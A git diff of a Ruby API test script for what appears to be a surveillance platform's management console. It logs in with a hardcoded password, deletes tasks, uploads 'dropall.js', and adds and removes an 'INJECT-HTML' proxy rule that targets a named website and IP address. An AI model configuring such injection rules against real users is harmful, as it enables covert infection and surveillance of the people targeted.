@@ -15,13 +15,14 @@ account = {
   :pass => 'danielep123'
   }
 resp = http.request_post('/auth/login', account.to_json, nil)
+puts "auth.login"
 puts resp.body
 cookie = resp['Set-Cookie'] unless resp['Set-Cookie'].nil?
 puts "cookie " + cookie
 puts
 
 # session
-if true
+if false
   # session.index
   res = http.request_get('/session', {'Cookie' => cookie})
   puts "session.index"
@@ -189,7 +190,7 @@ if false
    puts
    
   # audit.index
-   res = http.request_get('/audit?filter={"action": ["user.update"]}&startIndex=0&numItems=10', {'Cookie' => cookie})
+   res = http.request_get(URI.escape('/audit?filter={"action": ["user.update"]}&startIndex=0&numItems=10'), {'Cookie' => cookie})
    puts "audit.index 'user.update'"
    puts res
    puts
@@ -235,12 +236,10 @@ if false
   puts "status.counters"
   puts res
   puts
-
-  
 end
 
 # task
-if false
+if true
 
 res = http.request_get('/task', {'Cookie' => cookie})
 puts "task.index"
@@ -264,6 +263,16 @@ puts "task.show"
 puts res
 puts
 
+res = http.request_get("/task/destroy/#{task['_id']}", {'Cookie' => cookie})
+puts "task.destroy"
+puts res
+puts
+
+res = http.request_get("/task", {'Cookie' => cookie})
+puts "task.show"
+puts res
+puts
+
 =begin
 sleep 3
 
@@ -277,6 +286,7 @@ end # task
 
 # grid
 if false
+=begin
   grid_id = '4dfa1d1aa4df496c90fab43e' # 1.4 gb (underground.avi)
   #grid_id = '4dfa2483674bba48cd2a153f' # 280 mb (en_outlook.exe)
   fo = File.open('underground.avi', 'wb')
@@ -291,40 +301,109 @@ if false
   end
   fo.close
   puts "Got #{total} bytes."
+=end
+
+  fo = File.open('dropall.js', 'rb') do |f|
+    ret = http.request_post("/grid", f.read ,{'Cookie' => cookie})
+    puts ret
+  end
 end
 
 # proxy
 if false
+  
+  proxy_id = 0
+  
   # proxy.index
   res = http.request_get('/proxy', {'Cookie' => cookie})
   puts "proxy.index"
   
   proxies = JSON.parse(res.body)
   proxies.each do |proxy|
+    if proxy['_mid'] == 2
+      proxy_id = proxy['_id']
+    end
     puts proxy
     puts
   end
   
   # proxy.delete
-  proxies.each do |proxy|
-    puts "collector.delete"
-    ret = http.delete("/proxy/#{proxy['_id']}", {'Cookie' => cookie})
-    puts ret
-  end
+  #proxies.each do |proxy|
+  #  puts "proxy.delete"
+  #  ret = http.delete("/proxy/#{proxy['_id']}", {'Cookie' => cookie})
+  #  puts ret
+  #end
   
   # proxy.create
-  proxy = {name: 'test'}
-  res = http.request_post('/proxy', proxy.to_json, {'Cookie' => cookie})
-  puts "proxy.create"
+  #proxy = {name: 'test'}
+  #res = http.request_post('/proxy', proxy.to_json, {'Cookie' => cookie})
+  #puts "proxy.create"
+  #puts res
+  #puts
+  
+  #test_proxy = JSON.parse(res.body)
+  
+  # proxy.update
+  #proxy = {name: 'IPA', address: '1.2.3.4', redirect: '4.3.2.1', desc: 'test injection proxy', port: 4445, poll: true}
+  #res = http.request_put("/proxy/#{test_proxy['_id']}", proxy.to_json, {'Cookie' => cookie}) 
+  #puts "proxy.update "
+  #puts res
+  #puts
+  
+  # proxy.show
+  res = http.request_get("/proxy/#{proxy_id}", {'Cookie' => cookie})
+  puts "proxy.show"
+  proxy = JSON.parse(res.body)
+  puts proxy.inspect
+  puts
+  
+  # proxy.rules
+  puts "proxy.rules"
+  puts proxy['rules'].inspect
+  puts
+  
+  # proxy.add_rule
+  puts "proxy.add_rule"
+  rule = {_id: proxy_id, enabled: true, disable_sync: false, ident: 'STATIC-IP', 
+          ident_param: '14.11.78.4', probability: 100, resource: 'www.alor.it', 
+          action: 'INJECT-HTML', action_param: 'RCS_0000602', target: '4df8bc89963d3523c9000056'}
+  res = http.request_post("/proxy/add_rule", rule.to_json, {'Cookie' => cookie})
+  rule = JSON.parse(res.body)
+  puts rule
+  puts
+  
+  # proxy.rules
+  puts "proxy.show"
+  res = http.request_get("/proxy/#{proxy_id}", {'Cookie' => cookie})
+  proxy = JSON.parse(res.body)
+  puts proxy['rules'].inspect
+  puts
+  
+  # proxy.update_rule
+  puts "proxy.update_rule"
+  mod = {rule: rule['_id'], enabled: false, disable_sync: true, ident: 'STATIC-MAC',
+          ident_param: '00:11:22:33:44:55', target: '4df8bc89963d3523c9000056'}
+  res = http.request_post("/proxy/update_rule/#{proxy_id}", mod.to_json, {'Cookie' => cookie})
   puts res
   puts
   
-  test_proxy = JSON.parse(res.body)
+  # proxy.rules
+  puts "proxy.show"
+  res = http.request_get("/proxy/#{proxy_id}", {'Cookie' => cookie})
+  proxy = JSON.parse(res.body)
+  puts proxy['rules'].inspect
+  puts
   
-  # proxy.update
-  proxy = {name: 'IPA', address: '1.2.3.4', redirect: '4.3.2.1', desc: 'test injection proxy', port: 4445, poll: true}
-  res = http.request_put("/proxy/#{test_proxy['_id']}", proxy.to_json, {'Cookie' => cookie}) 
-  puts "proxy.update "
+  # proxy.del_rule
+  puts "proxy.del_rule"
+  request = {rule: rule['_id']}
+  res = http.request_post("/proxy/del_rule/#{proxy_id}", request.to_json, {'Cookie' => cookie})
+  puts res
+  puts
+  
+  # proxy.config
+  puts "proxy.config"
+  res = http.request_get("/proxy/config/#{proxy_id}", {'Cookie' => cookie})
   puts res
   puts
   
@@ -370,6 +449,6 @@ end
 # logout
 res = http.request_post('/auth/logout', nil, {'Cookie' => cookie})
 puts
-puts "auth.logout "
+puts "auth.logout"
 puts res
 puts
